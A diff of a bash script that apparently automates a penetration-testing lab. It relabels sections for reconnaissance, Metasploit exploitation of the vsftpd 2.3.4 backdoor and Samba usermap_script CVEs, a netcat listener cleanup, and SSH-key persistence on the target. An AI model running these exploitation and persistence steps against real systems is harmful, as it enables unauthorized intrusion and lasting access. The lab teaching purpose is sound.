@@ -23,19 +23,19 @@ echo "============================================================"
 echo ""
 
 # ------------------------------------------------------------------
-# 2.1 — Reconnaissance
+# LAB-1 — Reconnaissance
 # ------------------------------------------------------------------
 run_recon() {
-  echo "--- 2.1 — Reconnaissance ---"
+  echo "--- LAB-1 — Reconnaissance ---"
   bash "$SCRIPT_DIR/recon.sh" "$RHOST"
   echo ""
 }
 
 # ------------------------------------------------------------------
-# 2.2 — Exploitation vsftpd 2.3.4 (CVE-2011-2523)
+# LAB-2 — Exploitation vsftpd 2.3.4 (CVE-2011-2523)
 # ------------------------------------------------------------------
 run_vsftpd() {
-  echo "--- 2.2 — Exploitation vsftpd backdoor ---"
+  echo "--- LAB-2 — Exploitation vsftpd backdoor ---"
   local RC=$(mktemp)
   cat > "$RC" <<-EOF
 use exploit/unix/ftp/vsftpd_234_backdoor
@@ -56,10 +56,10 @@ EOF
 }
 
 # ------------------------------------------------------------------
-# 2.3 — Exploitation Samba usermap_script (CVE-2007-2447)
+# LAB-3 — Exploitation Samba usermap_script (CVE-2007-2447)
 # ------------------------------------------------------------------
 run_samba() {
-  echo "--- 2.3 — Exploitation Samba usermap_script ---"
+  echo "--- LAB-3 — Exploitation Samba usermap_script ---"
   # Nettoyer tout processus residuel sur le port
   pkill -f "nc.*$LPORT_SAMBA" 2>/dev/null || true
   local RC=$(mktemp)
@@ -82,10 +82,10 @@ EOF
 }
 
 # ------------------------------------------------------------------
-# 2.4 — Persistance : copie de cle SSH
+# LAB-3 — Persistance : copie de cle SSH (dans LAB-3)
 # ------------------------------------------------------------------
 run_persistence() {
-  echo "--- 2.4 — Persistance SSH ---"
+  echo "--- LAB-3 — Persistance SSH ---"
   if [ ! -f ~/.ssh/id_rsa.pub ]; then
     ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
   fi
